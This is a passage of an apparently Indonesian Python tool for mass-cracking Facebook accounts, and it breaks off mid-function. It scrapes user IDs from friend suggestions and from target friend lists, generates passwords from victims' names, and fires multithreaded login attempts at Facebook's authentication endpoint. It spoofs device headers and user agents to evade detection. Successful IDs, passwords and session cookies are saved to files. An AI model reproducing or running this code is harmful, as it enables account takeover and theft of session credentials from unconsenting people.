            "social_context_render_location": "FRIENDS_HOME",
            "should_prefetch_comment_in_fb_shorts": False,
            "enable_ai_video_summary": False,
            "dynamic_friending_tab_paginating_at_stream_use_customized_batch": False,
            "action_links_location": None,
            "should_fetch_social_context_gysj": False,
            "include_comment_can_viewer_report": False,
            "reading_attachment_profile_image_width": 0,
            "messenger_source_thread_id": None,
            "fetch_cix_screen_nt_payload": True,
            "should_fetch_viewer_best_language_prediction_for_dubbing": False,
            "disable_story_menu_actions": False,
            "dont_fetch_video_social_context": False,
            "inline_text_delight_comment_enabled": False,
            "include_previous_nickname_info": False,
            "should_fetch_gen_ai_feed_suggestions_response_category": False,
            "should_fetch_author_reacted": False,
            "size_style": None,
            "should_defer_fetch_fdd": False,
            "fb_shorts_group_author_picture_size": 110,
            "multi_share_item_image_size_param": 0,
            "video_channel_id": None,
            "contributor_pic_width": 0,
            "should_fetch_social_proof_combined_share_count": False,
            "video_channel_entry_point": None,
            "include_owning_profile_metadata": False,
            "should_fetch_post_click_message": False,
            "image_high_width": 0,
            "image_low_height": 0,
            "minutiae_image_size_large": 0,
            "skip_eligible_actors_fetch": False,
            "enable_cix_screen_rollout": False,
            "device_type": None,
            "should_fetch_iab_story_post_click_data": False,
            "scale": "2",
            "should_fetch_container_story": False,
            "enable_post_header_add_friend": False,
            "should_fetch_cache_score_tab": False,
            "enable_update_cta_background_color": False,
            "fetch_actors_count": 10,
            "skip_sample_entities_fields": False,
            "image_medium_height": 0,
            "should_fetch_thread_info_for_community_chats": True,
            "image_medium_width": 0,
            "include_comment_markdown": False,
            "include_inform_treatment": False,
            "website_preview_enabled": False,
            "fetch_answer_agent_id": False,
            "disable_goodwill_from_comments": False,
            "remove_dead_field": False,
            "stars_viewer_eligibility": None,
            "enable_alternative_inbox": True,
            "adaptive_image_quality": None,
            "image_low_width": 0,
            "remove_attachment_feedback": False,
            "enable_vdmc_migration_batch_5_removals": False,
            "skip_negative_feedback_actions": False,
            "is_from_messenger_thread": False,
            "should_enable_chapter_feedback": False,
            "should_fetch_backend_score_info": False,
            "should_fetch_comments_downvote_fields": False,
            "profile_image_size": 0,
            "enabled_app_rating": False,
            "enable_fetching_first_frame_thumbnail_from_attachment": False,
            "skip_top_level_comments_count": False,
            "should_fetch_collaborators_from_story": False,
            "should_fetch_page_private_reply_delegate_page_id": False,
            "defer_eligible_actors_fetch": False,
            "should_fetch_single_photo_attachment": False,
            "should_fetch_owner_edit_fields": False,
            "should_fetch_ads_blingbar_customization_data": False,
            "enable_comment_pin_v2": False,
            "friending_origin": "FRIENDLIST_EMPTY_STATE",
            "story_url_format": None,
            "disable_pin_unpin": False,
            "should_fetch_poke_status": False,
            "image_large_aspect_height": 0,
            "saved_lists_enabled": False,
            "is_work_is_sensitive_enabled": False,
            "fetch_edits_app_deep_dive_pill": False,
            "enable_reels_brs_content_blocklist": False,
            "inline_text_bolding_comment_enabled": False,
            "should_fetch_image_blurred": False,
            "goodwill_small_accent_image": 0,
            "inspiration_capabilities": None,
            "should_fetch_is_reels_video": False,
            "should_use_social_context_v2": False,
            "should_include_rate_limit_transparancy_fields": False,
            "should_fetch_social_proof_reshare_count": False,
            "should_fetch_gen_ai_deep_dive_cta_suggestions_preview": False,
            "enable_conversation_starter": False,
            "should_fetch_disable_3d_motion_setting": False,
            "should_fetch_is_eligible_for_imagine_ai": False,
            "scrubbing": None,
            "skip_top_level_comments_total_count": False,
            "include_ban_block_fields_for_pplus": False,
            "mib_mi2_post_embeddings_ds": None,
            "enable_fetching_auto_attribution_info_from_attachment": False,
            "client_product_identifier": None,
            "nt_context": {
                "bloks_version": "d1583f026cccd22345fea8de656bb1d8162dabcca3249d6a0610be47545ec31a",
                "theme_params": [
                    {"design_system_name": "XMDS", "value": ["three_neutral_gray"]},
                    {"design_system_name": "FDS", "value": []}
                ],
                "is_flipper_enabled": False,
                "debug_tooling_metadata_token": None,
                "is_push_on": True,
                "pixel_ratio": 2,
                "styles_id": "6100e7e89411ccf67ace027cedecd84f",
                "using_white_navbar": True
            },
            "should_fetch_permalink_aspect_ratio": False,
            "dont_load_templates": False,
            "should_fetch_fallback_actions": False,
            "skip_group_fields": False,
            "should_fetch_baked_in_text_urls": False,
            "fetch_profile_pic_expiration_information": False,
            "load_redundant_fields": False,
            "enable_hd": False,
            "fetch_presence_eligible": False,
            "remove_feedback_information": False,
            "poll_voters_count": 0,
            "enabled_group_post_topic": False,
            "should_skip_viewer_profile_permissions": False,
            "activity_count": 0,
            "enable_vowel_vdd_overlay": False,
            "should_fetch_is_reshareable_with_filter": False,
            "enable_fb_defer_mib_mi2_post_embeddings": False,
            "enable_user_signals_in_comments": False,
            "content_hint_section": "PYMK",
            "fetch_watch_topic_info": False,
            "nt_render_id": "0",
            "disable_structured_reporting": False,
            "device_id": None,
            "enable_rta_in_feed_guide": False,
            "profile_picture_normal_size": 184,
            "enable_vdmc_migrate_is_user_music_mimicker": False,
            "dynamic_friending_tab_paginating_after_cursor": cursor_val if cursor_val else "3::4ea1609e1206501e2bdb137d21957970"
        }
        params = {
            "method": "post",
            "pretty": "false",
            "format": "json",
            "server_timestamps": "true",
            "locale": "user",
            "purpose": "fetch",
            "fb_api_req_friendly_name": "FriendingJewelContentQuery_At_Connection_Pagination_Viewer_dynamic_friending_tab_paginating",
            "fb_api_caller_class": "AtConnection",
            "client_doc_id": "391589310114410242678031977512",
            "fb_api_client_context": json.dumps({
                "client_connection_size": conn_size[0],
                "is_background": False
            }),
            "variables": json.dumps(variables_saran),
            "fb_api_analytics_tags": json.dumps([
                "At_Connection",
                "pagination_framework:@connection",
                "GraphServices"
            ]),
            "client_trace_id": str(uuid.uuid4())
        }
        try:
            tel = requests.post('https://graph.facebook.com/graphql', headers=headers, params=params)
            return tel.text
        except:
            return None

    cursor = None
    no_new_data_count = 0
    while True:
        resp_text = fetch_page(cursor)
        if not resp_text:
            break
        hasil_baru = _extract_id_name_from_response(resp_text)
        jumlah_sebelum = len(id)
        with id_lock:
            for entry in hasil_baru:
                if entry not in id:
                    id.append(entry)
        sys.stdout.write(f"\r{P} Berhasil Mendapatkan {H}{len(id)}{P} id{P}  ");sys.stdout.flush()
        conn_size[0] += 10

        new_cursor = None
        try:
            m = re.search(r'"dynamic_friending_tab_paginating_after_cursor"\s*:\s*"([^"]+)"', resp_text)
            if m:
                new_cursor = m.group(1)
            if not new_cursor:
                m2 = re.search(r'"end_cursor"\s*:\s*"([^"]+)"', resp_text)
                if m2:
                    new_cursor = m2.group(1)
        except:
            pass

        if not new_cursor or new_cursor == cursor:
            break
        cursor = new_cursor

        if len(id) == jumlah_sebelum:
            no_new_data_count += 1
            if no_new_data_count >= 3:
                break
        else:
            no_new_data_count = 0

    print(f'\n{H}[ + ] Total Saran Teman terkumpul: {len(id)} ID{P}')
    atur_id()


def dump_friendlist():
    global id
    profile_id = input(f'{P}[ + ] Masukkan ID Target : ')
    print(f'\n{P}[ * ] Mulai dump friendlist...{P}')
    conn_size = [10]

    def fetch_page(cursor_val):
        machine_id_val = generate_machine_id()
        usdid_val = generate_usdid()
        zero_f_device_id_val = str(uuid.uuid4())
        app_scope_id_val = str(uuid.uuid4())
        trace_id = str(uuid.uuid4())
        headers = {
            'Host': 'graph.facebook.com',
            'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","request_category":"graphql","purpose":"fetch","retry_attempt":"0"},"application_tags":"AtConnection"}',
            'X-Fb-Rmd': 'state=URL_ELIGIBLE',
            'User-Agent': '[FBAN/FB4A;FBAV/555.0.0.49.59;FBBV/926293029;FBDM/{density=2.0,width=900,height=1600};FBLC/en_US;FBRV/0;FBCR/PSN;FBMF/Honor;FBBD/Honor;FBPN/com.facebook.katana;FBDV/BVL-AN16;FBSV/9;FBOP/1;FBCA/x86_64:arm64-v8a;]',
            'X-Zero-F-Device-Id': zero_f_device_id_val,
            'X-Graphql-Request-Purpose': 'fetch',
            'X-Fb-Friendly-Name': 'FriendListContentQuery_At_Connection_Pagination_User_friends_paginating',
            'X-Graphql-Client-Library': 'graphservice',
            'X-Fb-Appnetsession-Sid': hashlib.md5(os.urandom(16)).hexdigest(),
            'X-Fb-Tasos-Experimental': '1',
            'X-Zero-Eh': '2,,AWfXBoVjUgjwZTCmV22zR6bhEie32UEHDlBYUGvlb-VPaZo7FOrYeDwcQXywWi4E3bg',
            'X-Fb-Device-Group': '4025',
            'X-Fb-Integrity-Machine-Id': machine_id_val,
            'X-Fb-Net-Hni': '51000',
            'X-Fb-Sim-Hni': '51000',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': f'OAuth {accesstoken}',
            'X-Fb-Connection-Type': 'WIFI',
            'X-Meta-Zca': 'empty_token',
            'App-Scope-Id-Header': app_scope_id_val,
            'X-Meta-Usdid': usdid_val,
            'X-Fb-Network-Properties': 'Wifi;Validated;',
            'Content-Encoding': 'gzip',
            'Priority': 'u=0',
            'X-Fb-Qpl-Active-Flows-Json': '{"schema_version":"v3","inprogress_qpls":[{"marker_id":25952257,"annotations":{"current_endpoint":"AllFriendListContentFragment:profile_friends_page"}}],"snapshot_attributes":{}}',
            'X-Meta-Enable-Tasos-Ss-Bwe': '1',
            'X-Fb-Appnetsession-Nid': f'{hashlib.md5(os.urandom(16)).hexdigest()},Wifi',
            'X-Tigon-Is-Retry': 'False',
            'X-Fb-Product-Log': f'graphql:{trace_id}',
            'X-Fb-Http-Engine': 'Tigon/Liger',
            'X-Fb-Client-Ip': 'True',
            'X-Fb-Server-Cluster': 'True',
            'X-Fb-Conn-Uuid-Client': generate_conn_uuid(),
        }
        params = {
            "method": "post",
            "pretty": "false",
            "format": "json",
            "server_timestamps": "true",
            "locale": "user",
            "purpose": "fetch",
            "fb_api_req_friendly_name": "FriendListContentQuery_At_Connection_Pagination_User_friends_paginating",
            "fb_api_caller_class": "AtConnection",
            "client_doc_id": "246053409713652899616916907208",
            "fb_api_client_context": json.dumps({
                "client_connection_size": conn_size[0],
                "is_background": False
            }),
            "variables": json.dumps({
                "social_context_count": 1,
                "enable_story_ring": True,
                "profile_id": profile_id,
                "paginationPK": profile_id,
                "enable_profile_snippet": False,
                "profile_entry_point": "PROFILE_LISTS",
                "friends_paginating_at_stream_use_customized_batch": False,
                "profile_image_size": 120,
                "enable_presence": False,
                "should_use_social_context_v2": False,
                "enable_conversation_starter": False,
                "social_context_render_location": "PROFILE_FRIENDS_LIST",
                "should_fetch_profile_navigation_info": True,
                "friends_paginating_first": 20,
                "enable_pokes": False,
                "friends_paginating_after_cursor": cursor_val if cursor_val else "AQHSV_oSfgNBEK5qhg5E4ELoLOqC-ecrMucEoz1H7WrtJmf8CRWRY5GfvCTIe7d4sJ1UMsBrL3hiCneh_NNRX6w3_g",
                "order_by": ["light_weight_value_model_v1"]
            }),
            "fb_api_analytics_tags": json.dumps([
                "At_Connection",
                "pagination_framework:@connection",
                "GraphServices"
            ]),
            "client_trace_id": str(uuid.uuid4())
        }
        try:
            tel = requests.post('https://graph.facebook.com/graphql', headers=headers, params=params)
            return tel.text
        except:
            return None

    cursor = None
    no_new_data_count = 0
    while True:
        resp_text = fetch_page(cursor)
        if not resp_text:
            break
        hasil_baru = _extract_id_name_from_response(resp_text)
        jumlah_sebelum = len(id)
        with id_lock:
            for entry in hasil_baru:
                if entry not in id:
                    id.append(entry)
        sys.stdout.write(f"\r{P} Berhasil Mendapatkan {H}{len(id)}{P} id{P}  ");sys.stdout.flush()
        conn_size[0] += 10

        new_cursor = None
        try:
            m = re.search(r'"friends_paginating_after_cursor"\s*:\s*"([^"]+)"', resp_text)
            if m:
                new_cursor = m.group(1)
            if not new_cursor:
                m2 = re.search(r'"end_cursor"\s*:\s*"([^"]+)"', resp_text)
                if m2:
                    new_cursor = m2.group(1)
        except:
            pass

        if not new_cursor or new_cursor == cursor:
            break
        cursor = new_cursor

        if len(id) == jumlah_sebelum:
            no_new_data_count += 1
            if no_new_data_count >= 3:
                break
        else:
            no_new_data_count = 0

    print(f'\n{H}[ + ] Total Friendlist terkumpul: {len(id)} ID{P}')
    atur_id()


def atur_id():
     rr = random.randint
     for khusus_random in id:
            cyxieon_id = rr(0,len(uid2))
            uid2.insert(cyxieon_id, khusus_random)
     atur_method()

def atur_method():
    print("")
    print(f"\n[ 1 ] Metode Graph V1\n[ 2 ] Metode Graph V2\n[ 3 ] Metode Graph V3\n[ 4 ] Metode Graph V4\n[ 5 ] Metode APUI (Web Login)\n[ 6 ] Metode WEB (Web Login)\n[ 7 ] Metode Graph V5\n[ 8 ] Metode Graph V6\n[ 9 ] Metode Graph Lama 1\n[ 10 ] Metode Graph Lama 2\n[ 11 ] Metode Graph Lama 3\n[ 12 ] Metode M.BETA{P}")
    uhu = input("[ + ] Pilih menu : ")
    if uhu in ["1"]:
        method.append('API')
    elif uhu in ["2"]:
        method.append('APII')
    elif uhu in ["3"]:
        method.append('APIII')
    elif uhu in ["4"]:
        method.append('APIIII')
    elif uhu in ["5"]:
        method.append('APUII')
    elif uhu in ["6"]:
        method.append('APUIII')
    elif uhu in ["7"]:
        method.append('lolok')
    elif uhu in ["8"]:
        method.append('lolok1')
    elif uhu in ["9"]:
        method.append('lolok2')
    elif uhu in ["10"]:
        method.append('lolok3')
    elif uhu in ["11"]:
        method.append('lolok4')
    elif uhu in ["12"]:
        method.append('lolok5')
    Gabung()

def Gabung():
    pw_manual=input(f'\n[ + ] input password tambahan : ')
    print("")
    password_manual=pw_manual.split(',')
    for xpw in password_manual:
        pwnya.append(xpw)
    with tred(max_workers=50) as MethodeCrack:
        for user in id:
            uid,nama = user.split('|')[0],user.split('|')[1].lower()
            depan = nama.split(" ")[0]
            try:blkg = nama.split(' ')[1]
            except:blkg = depan
            pasw = []
            if len(nama)<=5:
                if len(depan)<3:
                    pass
                else:
                    pasw.append(nama.capitalize())
                    pasw.append(nama.lower())
                    pasw.append(depan.lower()+"123")
                    pasw.append(depan.lower()+"1234")
                    pasw.append(depan.lower()+"12345")
                    pasw.append(depan.lower()+"123456")
                    pasw.append(depan.capitalize()+"123")
                    pasw.append(depan.capitalize()+"1234")
                    pasw.append(depan.capitalize()+"12345")
                    pasw.append(depan.capitalize()+"123456")
                    pasw.append(depan.capitalize()+"12")
                    pasw.append(depan.capitalize()+"10")
                    pasw.append(depan.capitalize()+"01")
                    pasw.append(depan.capitalize()+"02")
                    pasw.append(depan.capitalize()+"03")
                    pasw.append(depan.capitalize()+"04")
            else:
                if len(depan)<3:
                    pasw.append(nama.capitalize())
                    pasw.append(nama.lower())
                else:
                    pasw.append(nama.capitalize())
                    pasw.append(nama.lower())
                    pasw.append(depan.lower()+"123")
                    pasw.append(depan.lower()+"1234")
                    pasw.append(depan.lower()+"12345")
                    pasw.append(depan.lower()+"123456")
                    pasw.append(depan.capitalize()+"123")
                    pasw.append(depan.capitalize()+"1234")
                    pasw.append(depan.capitalize()+"12345")
                    pasw.append(depan.capitalize()+"123456")
                    pasw.append(depan.capitalize()+"12")
                    pasw.append(depan.capitalize()+"10")
                    pasw.append(depan.capitalize()+"01")
                    pasw.append(depan.capitalize()+"02")
                    pasw.append(depan.capitalize()+"03")
                    pasw.append(depan.capitalize()+"04")
            for xpwd in pwnya:
                    pasw.append(xpwd)
            if 'API' in method:
                MethodeCrack.submit(APII,uid,pasw)
            elif 'APII' in method:
                MethodeCrack.submit(APX,uid,pasw)
            elif 'APIII' in method:
                 MethodeCrack.submit(APS,uid,pasw)
            elif 'APIIII' in method:
                 MethodeCrack.submit(APU,uid,pasw)
            elif 'APUII' in method:
                 MethodeCrack.submit(APUI,uid,pasw)
            elif 'APUIII' in method:
                 MethodeCrack.submit(APUIIII,uid,pasw)
            elif 'lolok' in method:
                 MethodeCrack.submit(apienak,uid,pasw)
            elif 'lolok1' in method:
                 MethodeCrack.submit(APUY,uid,pasw)
            elif 'lolok2' in method:
                 MethodeCrack.submit(apienak1,uid,pasw)
            elif 'lolok3' in method:
                 MethodeCrack.submit(apienak2,uid,pasw)
            elif 'lolok4' in method:
                 MethodeCrack.submit(apienak3,uid,pasw)
            elif 'lolok5' in method:
                 MethodeCrack.submit(yaya,uid,pasw)
            else:
                MethodeCrack.submit(APII,uid,pasw)
    print("\r")
    print(f"{P}[ + ] sukses crack {H}{len(uid2)}{P} id,dengan jumlah hasil Live : {H}{ok} {P}Chek : {K}{cp}{P}")

def generate_random_user_agent_api():
    def random_float(min_val, max_val):
        return round(random.uniform(min_val, max_val), 2)

    def random_int(min_val, max_val):
        return random.randint(min_val, max_val)

    mi_models = random.choice([
        "Mi 10", "Mi 10 Lite (5G)", "Mi 10 Lite Zoom", "Mi 10 Pro", "Mi 10 Ultra", "Mi 11",
        "Mi 11 (5G)", "Mi 11 LE", "Mi 11 Lite", "Mi 11 Lite (5G)", "Mi 11 Lite 5G NE", "Mi 11 Lite NE (5G)", "Mi 11 Pro",
        "Mi 11 Pro (5G)", "Mi 11 Ultra (5G)", "Mi 11i", "Mi 11i (5G)", "Mi 11T (5G)", "Mi 11T Pro", "Mi 11T Pro (5G)",
        "Mi 11X", "Mi 11X Pro (5G)", "Mi 12 Pro", "Mi 12T Pro", "Redmi 5 pro,", "Redmi 5Plus", "Redmi 85781",
        "2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I",
        "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C",
        "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY",
        "M2007J17G", "M2007J3SG"
    ])
    pixel_models = random.choice([
        "Pixel 2", "Pixel 2 XL", "Pixel 3", "Pixel 3 XL", "Pixel 3A", "Pixel 3A XL", "Pixel 4", "Pixel 4 XL",
        "Pixel 4a", "Pixel 4a (5G)", "Pixel 5", "Pixel 5a (5G)", "Pixel 6", "Pixel 6 Pro", "Pixel 6a", "Pixel 7",
        "Pixel 7 Pro", "Pixel 7a", "Pixel 8", "Pixel 8 Pro", "Pixel 8 Pro (5G)", "Pixel 8a", "Pixel 9", "Pixel 9 Pro",
        "Pixel 9 Pro Fold", "Pixel 9 Pro XL"
    ])

    ver_os = random.choice(['9|PPR1', '10|QP1A', '11|RP1A', '12|SP1A', '13|TP1A', '14|UP1A'])
    android = ver_os.split("|")[0]
    build = "Build/{}.{}.00{}".format(ver_os.split("|")[1], random_int(111111, 333333), random_int(1, 9))
    density, width, height = random_float(1.0, 4.0), random_int(720, 1440), random_int(1280, 2560)
    carrier = random.choice(['Telkomsel', 'XL', 'Indosat', 'Smartfren', 'Tri'])
    device = random.choice([f'google|{pixel_models}', f'xiaomi|{mi_models}'])
    device_brand, device_model = device.split("|")[0], device.split("|")[1]

    return f'[FBAN/FB4A;FBAV/486.0.0.66.70;FBBV/653066364;FBDM/{{density={density},width={width},height={height}}};FBLC/id_ID;FBRV/0;FBCR/XL;FBMF/{device_brand.capitalize()};FBBD/{device_brand};FBPN/com.facebook.mahos;FBDV/{device_model};FBSV/{android};FBOP/1;FBCA/arm64-v8a:;]'

def anjay():
    rr = random.randint
    rc = random.choice
    facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
    fbrv = str(random.randint(0, 999999999))
    density = random.choice(['2.0', '2.5', '3.0'])
    width = random.choice(["720", "1080", "1280", "1440"])
    height = random.choice(["720", "1080", "1280", "1440", "1920"])
    fbbv = str(random.randint(332275123, 932275123))
    kartu = random.choice(["Axieta","Telkomsel","HotRod","MTN-CG"])
    vivo = random.choice(["V2022","V2023","V2028","V2024","V2025","V2026","V2029","V2030","V2031"])
    xiaomi = random.choice(["23116PN5BC","22111317I","24053PY09I","2406ERN9CI","24048RN6CG","M2101K7BI","24115RA8EC","23028RNCAG","2312CRNCCL","23054RA19C","XIAOMI Redmi Note 9 Pro","Xiaomi Redmi Note 13","2207122MC"])
    ua1 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/{kartu};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{xiaomi};FBSV/11.0;FBOP/1;FBCA/arm64-v8a:]"
    ua2 = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};FBDM={{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{fbrv};FBCR/{kartu};FBMF/Vivo;FBBD/Vivo;FBPN/com.facebook.katana;FBDV/{vivo};FBSV/11.0;FBOP/1;FBCA/arm64-v8a:]"
    return random.choice([ua1,ua2])

def generate_dalvik_user_agent():
    rr = random.randint
    dalvik_user_agent = [
        'Dalvik/2.1.0 (Linux; U; Android 4.2.2; mito note a62 Build/JDQ39) [FBAN/Orca-Android;FBAV/18.0.0.%s.%s;FBLC/hr_HR;FBBV/%s;FBCR/TELE2;FBMF/Mito;FBBD/mito note a62;FBDV/Quadro SQ-50E85F;FBSV/4.2.2;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=480,height=854};FB_FW/1;]' % (rr(0, 43), rr(0, 50), rr(5791147, 6398209))
    ]
    return dalvik_user_agent[0]

def APII(uid,pasw):
    global loop,ok,cp
    print(f"\r {H}LOAD{P} {str(loop)}/{len(id)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}",end="")
    ses = requests.Session()
    for pw in pasw:
        try:
            ua = generate_dalvik_user_agent()
            headers={
                'Host': 'b-graph.facebook.com',
                'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
                'X-Fb-Net-Hni': str(random.randrange(51000, 100000)),
                'Zero-Rated': '0',
                'X-Fb-Sim-Hni': str(random.randrange(51000, 100000)),
                'X-Fb-Connection-Quality': 'EXCELLENT',
                'X-Fb-Friendly-Name': 'authenticate',
                'X-Fb-Connection-Bandwidth': str(random.randrange(50000000, 100000000)),
                'X-Tigon-Is-Retry': 'False',
                'User-Agent': x1(),
                'Authorization': 'OAuth null',
                'X-Fb-Connection-Type': 'WIFI',
                'X-Fb-Device-Group': str(random.randrange(5000, 10000)),
                'Priority': 'u=3,i',
                'X-Fb-Http-Engine': 'Liger',
                'X-Fb-Client-Ip': 'True',
                'X-Fb-Server-Cluster': 'True'}
            apcb = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': apcb,
                'generate_analytics_claim': '1',
                'community_id': '',
                'linked_guest_account_userid': '',
                'cpl': True,
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'secure_family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
                'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
                'enroll_misauth': False,
                'generate_session_cookies': '1',
                'error_detail_type': 'button_with_disabled',
                'source': 'login',
                'machine_id': '1',
                'jazoest': str(random.randrange(22000, 230000)),
                'meta_inf_fbmeta': 'V2_UNTAGGED',
                'advertiser_id': str(uuid.uuid4()),
                'encrypted_msisdn': '',
                'currently_logged_in_userid': '0',
                'locale': 'id_ID',
                'client_country_code': 'ID',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'sig': str(hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:32]),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            curl = 'https://b-graph.facebook.com/auth/login'
            q = ses.post(curl, headers=headers, data=data, allow_redirects=False,verify=True).json()
            if "session_key" in q:
                ok+=1
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                token = q["access_token"]
                print(f"\r{H}[ OK ] {uid}|{pw}|{coki}{P}                  ")
                open('ESBFLIVE/'+okc,'a').write(f"{uid}|{pw}|{coki}\n")
                break
            elif 'User must verify their account' in q['error']['message']:
                cp+=1
                print(f"\r{K}[ CP ] {uid}|{pw}{P}                   ")
                open('ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:time.sleep(30)
    loop+=1


def APUY(uid,pasw):
    global loop,ok,cp
    print(f"\r{H}Memuat...{P} {str(loop)}/{len(id)} Success :{H}{ok}{P} Failed :{K}{cp}{P}",end="")
    ses = requests.Session()
    for pw in pasw:
        try:
            ua = anjay()
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': pw,
                'generate_analytics_claim': '1',
                'community_id': '',
                'linked_guest_account_userid': '',
                'cpl': True,
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'secure_family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'account_switcher_uids': [],
                'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
                'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk',
                'enroll_misauth': False,
                'generate_session_cookies': '1',
                'error_detail_type': 'button_with_disabled',
                'source': 'login',
                'machine_id': ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for i in range(24)]),
                'jazoest': str(random.randrange(22000, 230000)),
                'meta_inf_fbmeta': 'V2_UNTAGGED',
                'advertiser_id': str(uuid.uuid4()),
                'encrypted_msisdn': '',
                'currently_logged_in_userid': '0',
                'locale': 'id_ID',
                'client_country_code': 'ID',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'sig': str(hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:32]),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            headers={
                'Host': 'b-graph.facebook.com',
                'X-Fb-Connection-Quality': 'EXCELLENT',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'User-Agent': x1(),
                'X-Tigon-Is-Retry': 'false',
                'X-Fb-Friendly-Name': 'authenticate',
                'X-Fb-Connection-Bandwidth': str(random.randrange(70000000, 800000000)),
                'Zero-Rated': '0',
                'X-Fb-Net-Hni': str(random.randrange(50000, 600000)),
                'X-Fb-Sim-Hni': str(random.randrange(50000, 600000)),
                'X-Fb-Request-Analytics-Tags': '{"network_tags":{"product":"350685531728","retry_attempt":"0"},"application_tags":"unknown"}',
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Fb-Connection-Type': 'WIFI',
                'X-Fb-Device-Group': str(random.randrange(4700, 50000)),
                'Priority': 'u=3,i',
                'X-Fb-Http-Engine': 'Liger',
                'X-Fb-Client-Ip': 'true',
                'X-Fb-Server-Cluster': 'true',
                'Content-Length': str(random.randrange(1500, 20000))}
            curl = 'https://b-graph.facebook.com/auth/login'
            q = ses.post(curl,data=data, headers=headers).json()
            if "session_key" in q:
                ok+=1
                coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                token = q["access_token"]
                print(f"\r{H}[ CIK-OK ] {uid}|{pw}{P}                  ")
                open('ESBFLIVE/'+okc,'a').write(f"{uid}|{pw}|{coki}\n")
                break
            elif 'User must verify their account' in q['error']['message']:
                cp+=1
                print(f"\r{K}[ CIK-CP ] {uid}|{pw}{P}                   ")
                open('ESBFCHEK/'+cpc,'a').write(f"{uid}|{pw}\n")
                break
            elif 'Keamanan' in q:
                print("Selesaikan Pemeriksaan Keamanan.",end="")
            elif 'Kami membatasi seberapa sering Anda dapat memposting, berkomentar, atau melakukan hal-hal lain dalam jumlah waktu tertentu untuk membantu melindungi komunitas dari spam. Anda bisa mencoba lagi nanti.  Pelajari Selengkapnya' in q:
                print("Kami membatasi seberapa sering.",end="")
            else:
                continue
        except requests.exceptions.ConnectionError:time.sleep(30)
    loop+=1

def APX(uid,pasw):
    global loop,ok,cp
    print(f"\r {H}LOAD{P} {str(loop)}/{len(id)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}",end="")
    ses = requests.Session()
    for pw in pasw:
        try:
            ua = generate_dalvik_user_agent()
            ses.headers.update({
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-sim-hni': '51009',
                'x-fb-net-hni': '51009',
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-graphql-client-library': 'graphservice',
                'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
                'x-tigon-is-retry': 'False',
                'x-fb-privacy-context': '3643298472347298',
                'x-graphql-request-purpose': 'fetch',
                'x-fb-device-group': '5530',
                'User-Agent': x1(),
                'x-fb-connection-type': 'WIFI',
                'x-fb-rmd': 'fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=56;recvTime=13823808',
                'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
                'x-fb-http-engine': 'Tigon/Liger',
                'x-fb-client-ip': 'True',
                'x-fb-server-cluster': 'True',
                })
            apcb = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
            data = {
                'method': 'post',
                'pretty': False,
                'format': 'json',
                'server_timestamps': True,
                'locale': 'ja_JP',
                'purpose': 'fetch',
                'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
                'fb_api_caller_class': 'graphservice',
